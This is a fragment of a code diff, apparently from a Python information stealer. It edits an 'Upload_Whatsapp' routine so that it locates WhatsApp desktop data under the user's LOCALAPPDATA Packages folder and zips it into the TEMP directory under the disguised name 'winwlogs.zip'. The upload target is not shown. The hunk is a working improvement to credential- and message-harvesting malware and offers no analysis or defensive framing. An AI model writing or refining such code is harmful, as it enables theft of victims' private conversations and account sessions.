@@ -2401,7 +2401,7 @@ def Get_Whatsapp(base_directory, zip_file_path):
 
 def Upload_Whatsapp():
     try:
-        x, y = Get_Whatsapp(f"{os.getenv('LOCALAPPDATA')}", os.path.join(os.getenv("TEMP"), "winwlogs.zip"))
+        x, y = Get_Whatsapp(f"{os.getenv('LOCALAPPDATA')}\\Packages\\", os.path.join(os.getenv("TEMP"), "winwlogs.zip"))
         if logfile == True:
             move_file_to_temp_folder(y)
             return
